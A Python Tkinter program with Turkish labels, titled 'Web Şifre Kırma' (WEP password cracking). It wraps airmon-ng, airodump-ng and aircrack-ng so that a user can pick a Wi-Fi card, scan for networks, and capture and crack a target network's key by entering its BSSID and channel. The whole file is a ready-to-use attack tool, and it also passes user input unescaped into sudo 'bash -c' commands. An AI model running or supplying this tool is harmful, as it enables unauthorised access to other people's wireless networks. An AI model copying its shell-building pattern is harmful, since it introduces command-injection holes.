from tkinter import *
from tkinter import messagebox, ttk
import subprocess
import os
import time
# Function to populate the interface selection dropdown
def interface_secme():
    global entr1
    label1 = Label(pencere1, text="Lütfen USB Wi-Fi kartınızı seçin")
    label1.pack()

    try:
        # Get network interfaces using ifconfig
        interface = subprocess.run(["ifconfig"], capture_output=True, text=True, check=True)
        interface = interface.stdout
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Hata", f"İnterface alınamadı: {e.stderr}")
        return

    arayuzler = []
    lines = interface.split('\n')
    for line in lines:
        if 'flags' in line:
            arayuz_ad = line.split(":")[0]
            arayuzler.append(arayuz_ad)

    # Create a dropdown for interfaces
    entr1 = ttk.Combobox(pencere1, values=arayuzler)
    entr1.pack()

# Function to handle the scanning and subsequent attack
def tarama():
    def attack():
        yeni_dizin = "/home/kali/Desktop/web_sifre_kirma"
        os.chdir(yeni_dizin)        
        bssid = entr2.get()
        channel = entr3.get()
        if not bssid or not channel:
            messagebox.showwarning("Uyarı", "Lütfen BSSID ve Kanal bilgilerini giriniz!")
            return
        try:
            # Start airodump-ng and aircrack-ng in new terminal windows
            subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f"sudo airodump-ng --bssid {bssid} --channel {channel} --write web_dosyası wlan0mon; exec bash"])
            time.sleep(10)
            subprocess.Popen(['gnome-terminal', '--', 'bash', '-c',"sudo aircrack-ng web_dosyası-01.cap; exec bash"])
        except subprocess.CalledProcessError as e:
            messagebox.showerror("Hata", f"Komut çalıştırılamadı: {e.stderr}")

    deger = entr1.get()
    if not deger:
        messagebox.showwarning("Uyarı", "Lütfen bir arayüz seçin!")
        return

    yeni_dizin = "/home/kali/Desktop"
    os.chdir(yeni_dizin)
    yeni_klasor = "web_sifre_kirma"
    if not os.path.exists(yeni_klasor):
        os.makedirs(yeni_klasor)

    try:
        # Start airmon-ng
        subprocess.run(["sudo", "airmon-ng", "start", deger], capture_output=True, text=True, check=True)
        # Open airodump-ng in a new terminal window
        subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', "sudo airodump-ng wlan0mon; exec bash"])
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Hata", f"Komut çalıştırılamadı: {e.stderr}")
        return

    # Create entries for BSSID and channel
    lab2 = Label(pencere1, text="Lütfen web ağı bilgilerinizi giriniz")
    lab2.pack()
    lab3 = Label(pencere1, text="BSSID giriniz")
    lab3.pack()
    global entr2
    entr2 = Entry(pencere1)
    entr2.pack()
    lab4 = Label(pencere1, text="Channel giriniz")
    lab4.pack()
    degerler = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13"]
    global entr3
    entr3 = ttk.Combobox(pencere1, values=degerler)
    entr3.pack()  
    but2 = Button(pencere1, text="Saldırıyı Başlat", command=attack)
    but2.pack()

# Main GUI window setup
pencere1 = Tk()
pencere1.title("Web Şifre Kırma")
pencere1.geometry("500x500")

# Populate the interface dropdown
interface_secme()

# Button to start scanning
but1 = Button(pencere1, text="Taramayı Başlat", command=tarama)
but1.pack()

# Run the Tkinter main loop
pencere1.mainloop()
